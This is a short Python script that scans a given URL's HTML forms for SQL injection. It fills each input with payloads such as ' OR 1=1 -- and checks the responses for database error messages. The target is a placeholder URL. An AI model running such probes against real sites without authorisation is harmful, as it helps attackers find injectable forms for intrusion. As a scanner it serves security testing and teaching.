import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Session to handle requests with a user agent
s = requests.Session()
s.headers["User-Agent"] = "/"

# Function to extract all forms from a given URL
def get_forms(url):
    try:
        response = s.get(url)
        response.raise_for_status()  # Raise HTTPError for bad responses
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except requests.RequestException as e:
        print(f"Error fetching URL: {e}")
        return []

# Extract details from each form (method, action, inputs)
def form_details(form):
    details = {}
    details['action'] = form.attrs.get("action", "")
    details['method'] = form.attrs.get("method", "get").lower()
    inputs = []

    # Extract input fields and their attributes
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    details['inputs'] = inputs
    return details

# Check if a given response indicates SQL vulnerability
def is_vulnerable(response):
    error_signatures = [
        "quoted string not properly terminated",
        "unclosed quotation mark after the character string",
        "you have an error in your sql syntax"
    ]
    for error in error_signatures:
        if error in response.text.lower():
            return True
    return False

# Main function to scan for SQL injection vulnerabilities
def sql_injection_scan(url):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}")

    for form in forms:
        form_data = form_details(form)
        action_url = urljoin(url, form_data["action"])
        
        # Test SQL payloads on each input
        for payload in ["'", "\"", "' OR 1=1 --", "\" OR 1=1 --"]:
            data = {}
            for input_field in form_data["inputs"]:
                # Only test non-submit inputs
                if input_field["type"] != "submit":
                    data[input_field["name"]] = f"test{payload}"

            # Make request based on form method
            try:
                if form_data["method"] == "post":
                    response = s.post(action_url, data=data)
                else:  # Default to GET method
                    response = s.get(action_url, params=data)

                # Check for vulnerability indicators
                if is_vulnerable(response):
                    print(f"[!] SQL Injection vulnerability detected at {action_url}")
                    print(f"   Payload: {payload}")
                    return  # Stop after first detection
            except requests.RequestException as e:
                print(f"Error testing form: {e}")
    print("[+] No SQL Injection vulnerabilities detected.")

# Entry point of the script
if __name__ == "__main__":
    target_url = "https://www.example.com"  # Replace with your target URL
    sql_injection_scan(target_url)
